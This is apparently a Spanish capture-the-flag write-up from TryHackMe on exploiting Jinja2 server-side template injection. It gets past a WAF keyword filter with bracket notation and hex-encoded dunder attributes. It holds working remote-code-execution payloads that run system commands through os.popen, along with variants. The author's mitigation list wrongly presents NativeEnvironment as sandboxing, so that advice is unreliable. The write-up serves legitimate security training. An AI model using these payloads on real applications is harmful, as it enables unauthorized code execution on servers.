---
title: "SSTI Hex Encoding Bypass"
platform: "TryHackMe"
os: "Windows"
difficulty: "Hard"
ip: "10.82.144.73"
slug: "ssti-hex-encoding-bypass"
author: "Z4k7"
date: "2026-03-29"
year: "2026"
status: "pwned"
tags:
  - "SSTI"
  - "RCE"
  - "Bypass"
  - "WAF"
  - "Templates"
  - "redteam"
techniques:
  - "SSTI"
  - "Server-Side Template Injection"
  - "WAF"
  - "RCE"
tools:
  - "Burp Suite"
  - "Python"
  - "Curl"
flags_list:
  - label: "user"
    value: "RCE Confirmado — hostname: waf-evasion-challenge-container"
summary: "Campo vulnerable a SSTI (Server-Side Template Injection) en motor de templates Python Jinja2. Confirmación inicial: {{ 7*7 }} devuelve 49 (template engine evaluando expresiones). Intento directo de RCE bloqueado por WAF. Bypass mediante hex encoding de atributos Python especiales: __init__ → \x5f\x5f\x69\x6e\x69\x74\x5f\x5f. Resultado: ejecución remota de comandos del sistema como usuario del servidor web.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Campo de entrada que parece aceptar template expressions. Test simple para confirmar SSTI:
      - kind: "code"
        lang: "BASH"
        code: |
          {{ 7*7 }}
      - kind: "note"
        text: |
          Respuesta: `49` ✅ — Template engine evaluando expresiones matemáticas
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195558521.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Si un campo devuelve `49` cuando inyectas `{{ 7*7 }}`, confirmo: hay SSTI. La aplicación está evaluando tu input como código de template, no como texto plano. Esto es el inicio del camino a RCE."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Motor de templates identificado: Jinja2 (Python).
          Intentamos RCE directo:
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
      - kind: "note"
        text: |
          Resultado: Status 403 Forbidden — WAF bloqueando
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195545166.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          WAF detecta y bloquea:
          `__init__` (atributo especial)
          `__globals__` (atributo especial)
          `__builtins__` (atributo especial)
          `__import__` (función peligrosa)
          Esto sugiere que el WAF tiene una blacklist de atributos especiales Python. Necesitamos ofuscar estos nombres.
      - kind: "callout"
        type: "warning"
        label: "Atributos especiales bajo vigilancia"
        text: "El WAF está específicamente monitoreando los atributos que permiten acceso a objetos globales. Esta es una defensa bien pensada, pero..."
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195534515.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Cuando una defensa busca palabras clave específicas, piensa: ¿en qué representación busca? Busca texto plano. ¿Puede decodificar hex? Probablemente no."

  - id: "step3"
    num: "03"
    title: "Paso 1: Entender Object Traversal en Jinja2"
    content:
      - kind: "note"
        text: |
          En Jinja2, acceder a atributos se puede hacer de dos formas:
          Dot notation (buscada por WAF):
      - kind: "code"
        lang: "BASH"
        code: |
          {{ object.attribute }}
      - kind: "note"
        text: |
          Bracket notation (menos común, no buscada):
      - kind: "code"
        lang: "BASH"
        code: |
          {{ object['attribute'] }}
      - kind: "note"
        text: |
          Ambas son idénticas en ejecución. El bracket notation permite usar strings arbitrarios como clave.

  - id: "step4"
    num: "04"
    title: "Paso 2: Hex encoding de atributos peligrosos"
    content:
      - kind: "note"
        text: |
          Los atributos especiales `__xxxx__` contienen underscores (`_`). En Python/strings:
      - kind: "bullet"
        text: "_ es carácter ASCII 95 → en hex: \x5f"
      - kind: "bullet"
        text: "__init__ → todos los caracteres convertidos: \x5f\x5f\x69\x6e\x69\x74\x5f\x5f"
      - kind: "note"
        text: |
          Tabla de conversión:
      - kind: "code"
        lang: "BASH"
        code: |
          _ = 0x5f = \x5f
          i = 0x69 = \x69
          n = 0x6e = \x6e
          i = 0x69 = \x69
          t = 0x74 = \x74
          _ = 0x5f = \x5f
          
          __init__ = \x5f\x5f\x69\x6e\x69\x74\x5f\x5f
      - kind: "note"
        text: |
          Otros atributos:
      - kind: "code"
        lang: "BASH"
        code: |
          __globals__ = \x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f
          __builtins__ = \x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f
          __import__ = \x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f

  - id: "step5"
    num: "05"
    title: "Paso 3: Construir payload ofuscado"
    content:
      - kind: "note"
        text: |
          Payload original (bloqueado):
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
      - kind: "note"
        text: |
          Payload ofuscado (usando bracket notation + hex):
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x68\x6f\x73\x74\x6e\x61\x6d\x65')['\x72\x65\x61\x64']() }}
      - kind: "note"
        text: |
          Desglose:
          `self` → objeto template actual
          `['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']` → accede a atributo `__init__` (nombre en hex)
          `['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']` → accede a `__globals__` (namespace global de función)
          `['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']` → accede a `__builtins__` (funciones built-in)
          `['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']` → accede a función `__import__`
          `('\x6f\x73')` → importar módulo `os` (hex: `\x6f` = 'o', `\x73` = 's')
          `['\x70\x6f\x70\x65\x6e']` → accede a función `popen` del módulo os
          `('\x68\x6f\x73\x74\x6e\x61\x6d\x65')` → ejecutar comando `hostname` (hex)
          `['\x72\x65\x61\x64']` → accede a función `read()` del objeto popen (para obtener output)
          Resultado: Status 200 ✅ — WAF no bloquea
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195534515.jpg"
        caption: "Evidencia técnica"

  - id: "step6_1"
    num: "06"
    title: "Paso 4: Ejecutar comandos del sistema"
    content:
      - kind: "note"
        text: |
          Una vez confirmado que RCE funciona, cambiar comando final para obtener información del servidor:
          Obtener nombre del host:
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x68\x6f\x73\x74\x6e\x61\x6d\x65')['\x72\x65\x61\x64']() }}
      - kind: "note"
        text: |
          Respuesta:
      - kind: "code"
        lang: "BASH"
        code: |
          waf-evasion-challenge-container
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195517303.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "07"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          RCE confirmado. El servidor ejecuta comandos como usuario del servicio web (normalmente `www-data` o `apache`).
          Potencial completo:
      - kind: "bullet"
        text: "Lectura de archivos sensibles (/etc/passwd, configuraciones, tokens)"
      - kind: "bullet"
        text: "Escritura de archivos (webshells, backdoors)"
      - kind: "bullet"
        text: "Movimiento lateral en red interna"
      - kind: "bullet"
        text: "Escalada de privilegios (buscar sudo, SUID, capabilities)"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "user"
        value: "RCE Confirmado — hostname: waf-evasion-challenge-container"

  - id: "step8_1"
    num: "08"
    title: "Variaciones"
    content:
      - kind: "note"
        text: |
          Si `__import__` está detectado, alternativas:
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self.__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()") }}
      - kind: "note"
        text: |
          O usar otros atributos:
      - kind: "code"
        lang: "BASH"
        code: |
          {{ self.__init__.__globals__.__loader__.get_source(None, 'os') }}

lessons:
  - 'SSTI es crítico → acceso directo a objetos servidor sin intermediarios'
  - 'Bracket notation `[''attribute'']` permite bypass del WAF'
  - 'Hex encoding se decodifica en runtime Python pero WAF no lo entiende'
  - 'Atributos especiales `__xxxx__` son puerta de entrada a funciones peligrosas'
  - 'Jinja2 da acceso a `__globals__` → `__import__` → RCE directo'
  - 'No hay serialización: diferencia de SSTI vs Deserialization attacks'
mitigation:
  - 'Sandboxing de Jinja2: Usar `jinja2.nativetypes.NativeEnvironment` con restricciones'
  - 'Deshabilitar atributos especiales: Configuración de Jinja2 para no permitir acceso a `__init__`, `__globals__`, etc.'
  - 'Input validation: Rechazar `{` y `}` si el usuario no necesita templates'
  - 'WAF con decodificación hex: Normalizar `\xXX` ANTES de buscar patrones'
  - 'Límite de potencia computacional: Detectar loops infinitos o operaciones costosas'
  - 'Auditoría de módulos: Prohibir `__import__(''os'')` explícitamente'
---
